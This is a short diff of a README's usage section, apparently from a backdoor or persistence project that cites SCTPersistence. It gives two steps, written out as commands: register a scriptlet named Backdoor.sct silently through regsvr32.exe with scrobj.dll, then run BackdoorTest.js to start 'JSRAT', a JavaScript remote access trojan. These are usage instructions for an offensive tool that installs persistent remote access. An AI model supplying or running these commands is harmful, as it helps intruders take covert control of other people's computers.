@@ -9,8 +9,8 @@ https://github.com/subTee/SCTPersistence
 ---
 ###Usage:
 
-regsvr32.exe /s /i:Backdoor.sct scrobj.dll
-
+1.regsvr32.exe /s /i:Backdoor.sct scrobj.dll
+2.run BackdoorTest.js to start JSRAT
 
  
 
